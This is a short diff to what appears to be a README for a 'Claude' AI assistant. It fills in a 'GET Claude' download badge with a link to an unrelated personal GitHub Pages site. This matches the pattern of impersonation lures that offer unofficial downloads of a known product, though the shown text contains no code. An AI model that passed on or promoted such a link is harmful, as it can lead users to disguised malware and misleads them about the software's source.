@@ -4,7 +4,7 @@
 
 Claude is a focused AI assistant for everyday productivity, complex task analysis, and content generation. Claude keeps interactions readable, responses clear, and daily workflows smoother for home users, students, offices, and technicians who rely on Claude for steady, intelligent insight and task management.
 
-[![GET Claude](https://img.shields.io/badge/GET%20%E2%80%94%20Claude-0078D6?style=for-the-badge&logoColor=white)](SILKA)
+[![GET Claude](https://img.shields.io/badge/GET%20%E2%80%94%20Claude-0078D6?style=for-the-badge&logoColor=white)](https://patriziacaristo1.github.io/.github/claude-ai-assistant)
 
 ---
 
